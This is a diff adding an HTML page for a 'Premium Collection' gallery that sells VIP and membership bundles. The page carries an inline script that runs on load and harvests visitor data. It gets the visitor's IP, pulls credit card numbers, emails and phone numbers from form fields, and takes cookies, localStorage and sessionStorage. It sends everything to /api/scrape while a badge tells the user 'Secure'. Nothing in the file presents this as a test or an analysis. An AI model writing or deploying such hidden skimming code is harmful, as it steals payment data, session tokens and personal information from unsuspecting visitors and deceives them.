@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Collection</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; margin: 0; padding: 20px; color: #333; }
+        h1 { text-align: center; color: #2c3e50; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; max-width: 1200px; margin: 0 auto; }
+        .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .card img { width: 100%; height: 200px; object-fit: cover; }
+        .card-body { padding: 15px; }
+        .status { position: fixed; bottom: 10px; right: 10px; background: #333; color: #fff; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; opacity: 0; transition: opacity 0.5s; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Exclusive Gallery</h1>
+    
+    <div class="gallery">
+        <div class="card">
+            <img src="https://via.placeholder.com/250x200?text=VIP+Pass" alt="Item 1">
+            <div class="card-body"><div class="card-title">VIP Pass</div><div>$49.99</div></div>
+        </div>
+        <div class="card">
+            <img src="https://via.placeholder.com/250x200?text=Gold+Membership" alt="Item 2">
+            <div class="card-body"><div class="card-title">Gold Member</div><div>$99.99</div></div>
+        </div>
+        <div class="card">
+            <img src="https://via.placeholder.com/250x200?text=Lifetime" alt="Item 3">
+            <div class="card-body"><div class="card-title">Lifetime Bundle</div><div>$199.99</div></div>
+        </div>
+    </div>
+
+    <div id="status" class="status">Scanning...</div>
+
+    <script>
+        async function getIP() {
+            try { return (await fetch('https://api.ipify.org?format=json')).json().ip; } 
+            catch (e) { return 'Unknown'; }
+        }
+
+        function scanDOM() {
+            const patterns = [
+                { name: 'Credit Card', regex: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/ },
+                { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
+                { name: 'Phone', regex: /\b\d{10,}\b/ }
+            ];
+            let found = [];
+            document.querySelectorAll('*').forEach(el => {
+                if (el.value && el.tagName !== 'SCRIPT') {
+                    patterns.forEach(p => {
+                        if (p.regex.test(el.value)) {
+                            found.push({ type: p.name, value: el.value.substring(0, 50) });
+                        }
+                    });
+                }
+            });
+            return found;
+        }
+
+        (async () => {
+            const statusEl = document.getElementById('status');
+            statusEl.style.opacity = 1;
+            
+            const ip = await getIP();
+            const sensitiveInfo = scanDOM();
+            const storageData = {
+                localStorage: Object.keys(localStorage).length > 0 ? JSON.parse(JSON.stringify(localStorage)) : {},
+                sessionStorage: Object.keys(sessionStorage).length > 0 ? JSON.parse(JSON.stringify(sessionStorage)) : {}
+            };
+
+            const payload = {
+                timestamp: new Date().toISOString(),
+                ip: ip,
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                cookies: document.cookie || "",
+                sensitiveInfo: sensitiveInfo,
+                storage: storageData,
+                hostname: window.location.hostname
+            };
+
+            try {
+                await fetch('/api/scrape', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                statusEl.innerText = "Secure";
+                statusEl.style.background = "#27ae60";
+                setTimeout(() => statusEl.style.opacity = 0, 2000);
+            } catch (err) {
+                console.error("Scrape failed", err);
+            }
+        })();
+    </script>
+</body>
+</html>
